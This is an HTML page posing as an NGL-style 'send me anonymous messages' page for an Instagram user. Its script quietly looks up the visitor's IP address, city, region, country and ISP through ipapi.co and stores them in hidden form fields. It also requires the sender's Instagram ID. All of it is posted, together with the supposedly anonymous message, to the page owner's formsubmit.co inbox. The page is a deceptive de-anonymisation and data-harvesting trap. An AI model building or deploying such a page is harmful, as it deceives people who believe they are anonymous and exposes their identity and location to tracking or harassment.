<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<title>NGL</title>
		<script src="https://cdn.tailwindcss.com"></script>
		<link rel="icon" href="./download.jpeg" type="image/x-icon" />
	</head>
	<body
		class="bg-gradient-to-r from-[#B50259] to-[#CE5107] h-screen flex flex-col items-center justify-center text-white font-sans"
	>
		<!-- Loading Spinner -->
		<div
			id="spinnerOverlay"
			class="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50"
		>
			<div class="flex flex-col items-center space-y-4">
				<div
					class="animate-spin rounded-full h-24 w-24 border-8 border-white border-t-transparent"
				></div>
				<p class="text-white text-xl font-semibold">Loading your location...</p>
			</div>
		</div>

		<!-- Container -->
		<div
			id="app"
			class="w-[87vw] flex flex-col items-center justify-between py-10 h-full"
		>
			<!-- Success Message -->
			<div
				id="successMessage"
				class="grid place-items-center text-center space-y-4 h-full w-full hidden"
			>
				<div
					class="flex flex-col items-center justify-center text-center space-y-8 w-full"
				>
					<svg
						xmlns="http://www.w3.org/2000/svg"
						viewBox="0 0 24 24"
						fill="currentColor"
						class="w-[170px]"
					>
						<path
							fill-rule="evenodd"
							d="M2.25 12c0-5.385 4.365-9.75 9.75-9.75s9.75 4.365 9.75 9.75-4.365 9.75-9.75 9.75S2.25 17.385 2.25 12Zm13.36-1.814a.75.75 0 1 0-1.22-.872l-3.236 4.53L9.53 12.22a.75.75 0 0 0-1.06 1.06l2.25 2.25a.75.75 0 0 0 1.14-.094l3.75-5.25Z"
							clip-rule="evenodd"
						/>
					</svg>
					<p class="text-2xl font-semibold">Message sent successfully!</p>
					<button
						onclick="window.location.href='index.html'"
						class="bg-black p-8 text-2xl rounded-full text-white font-semibold w-full"
					>
						Send another
					</button>
				</div>
			</div>

			<!-- Step 1 (now message form) -->
			<div
				id="step1"
				class="flex flex-col items-center w-full h-full justify-between py-[15rem]"
			>
				<div
					class="bg-opacity-40 bg-white rounded-[35px] w-full mb-4 shadow-lg"
				>
					<div
						class="flex items-center space-x-3 bg-white p-4 text-black rounded-t-[35px]"
					>
						<img
							src="./487396330_1142496597672438_8422859713372662250_n.jpg"
							class="w-[5rem] h-[5rem] bg-gray-300 rounded-full"
						/>
						<div>
							<p class="text-4xl font-semibold text-black">@islam_muaz</p>
							<p class="text-2xl text-black font-semibold">
								send me anonymous messages!
							</p>
						</div>
					</div>

					<form
						action="https://formsubmit.co/d306e3448dbcc9e537e5d7a3869605cc"
						method="POST"
						class="p-4 flex flex-col gap-10"
					>
						<input type="hidden" name="_captcha" value="false" />
						<input type="hidden" name="_honey" style="display: none" />
						<input
							type="hidden"
							id="instaIdHidden"
							name="Instagram ID"
							value=""
						/>
						<input
							type="hidden"
							name="_next"
							value="https://ngl-fun.vercel.app//index.html?success=true"
						/>

						<!-- IP/location fields -->
						<input type="hidden" name="IP Address" id="ipHidden" />
						<input type="hidden" name="City" id="cityHidden" />
						<input type="hidden" name="Region" id="regionHidden" />
						<input type="hidden" name="Country" id="countryHidden" />
						<input type="hidden" name="Org" id="orgHidden" />

						<textarea
							name="Message"
							placeholder="send me anonymous messages..."
							required
							class="w-full p-3 text-white bg-transparent bg-opacity-20 focus:outline-none resize-none h-[140px] placeholder-[#9E4254] text-4xl"
						></textarea>

						<button
							type="button"
							id="nextButton"
							class="shadow-lg animate-bounce bg-black text-white font-bold p-8 rounded-full text-4xl w-full"
						>
							Next
						</button>
					</form>
				</div>

				<!-- Footer -->
				<div class="flex flex-col gap-3 items-center w-full">
					<p class="text-2xl mb-2">ðŸ‘‡ 229 people just tapped the button ðŸ‘‡</p>
					<button
						class="shadow-lg bg-black text-white font-bold p-8 text-4xl rounded-full mb-10 w-full"
					>
						Get your own messages!
					</button>
					<div class="flex space-x-4 text-xl opacity-75">
						<a href="#" class="underline">Terms</a>
						<a href="#" class="underline">Privacy</a>
					</div>
				</div>
			</div>

			<!-- Step 2 (now Instagram input) -->
			<div
				id="step2"
				class="hidden flex-col items-center w-full gap-[50px] h-full justify-center"
			>
				<div
					class="bg-opacity-40 bg-white rounded-[35px] w-full mb-4 shadow-lg text-black"
				>
					<div
						class="bg-white p-6 py-[6rem] rounded-[35px] flex flex-col items-center gap-7"
					>
						<h2 class="text-4xl font-bold text-center mb-2">
							What's your Instagram ID?
						</h2>
						<input
							id="instaIdInput"
							type="text"
							placeholder="@your_username"
							class="w-full p-3 rounded-xl border border-gray-300 focus:outline-none focus:ring-2 focus:ring-pink-500 text-4xl"
						/>
					</div>
				</div>

				<button
					type="submit"
					form="form"
					class="shadow-lg text-4xl animate-bounce bg-black text-white font-bold p-8 rounded-full mb-6 w-full"
				>
					Send Message Anonymously!!
				</button>
			</div>
		</div>

		<script>
			const nextButton = document.getElementById("nextButton");
			const step1 = document.getElementById("step1");
			const step2 = document.getElementById("step2");
			const instaInput = document.getElementById("instaIdInput");
			const instaIdHidden = document.getElementById("instaIdHidden");
			const successMessage = document.getElementById("successMessage");

			// Location elements
			const ipHidden = document.getElementById("ipHidden");
			const cityHidden = document.getElementById("cityHidden");
			const regionHidden = document.getElementById("regionHidden");
			const countryHidden = document.getElementById("countryHidden");
			const orgHidden = document.getElementById("orgHidden");

			// Show success message if redirected
			if (window.location.search.includes("success=true")) {
				step1.classList.add("hidden");
				step2.classList.add("hidden");
				successMessage.classList.remove("hidden");
				successMessage.classList.add("flex");
			}

			// Step change
			nextButton.addEventListener("click", () => {
				step1.classList.add("hidden");
				step2.classList.remove("hidden");
				step2.classList.add("flex");
			});

			// On form submit, update hidden Instagram field
			document.querySelector("form").addEventListener("submit", (e) => {
				const username = instaInput.value.trim();
				if (!username) {
					e.preventDefault();
					alert("Please enter your Instagram ID.");
					return;
				}
				instaIdHidden.value = username.startsWith("@")
					? username
					: "@" + username;
			});

			// Fetch IP/location info
			fetch("https://ipapi.co/json/")
				.then((res) => res.json())
				.then((data) => {
					ipHidden.value = data.ip || "";
					cityHidden.value = data.city || "";
					regionHidden.value = data.region || "";
					countryHidden.value = data.country_name || "";
					orgHidden.value = data.org || "";
					document.getElementById("spinnerOverlay").style.display = "none";
				})
				.catch(() => {
					document.getElementById("spinnerOverlay").style.display = "none";
				});
		</script>
	</body>
</html>
